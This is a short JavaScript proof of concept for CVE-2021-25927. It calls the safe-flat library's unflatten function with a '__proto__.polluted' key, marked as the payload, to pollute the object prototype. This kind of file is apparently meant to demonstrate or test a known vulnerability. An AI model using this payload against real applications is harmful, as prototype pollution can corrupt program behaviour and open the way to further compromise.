//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25927
var safeFlat = require("safe-flat");
safeFlat.unflatten({"__proto__.polluted": "yes"}, '.');//payload
  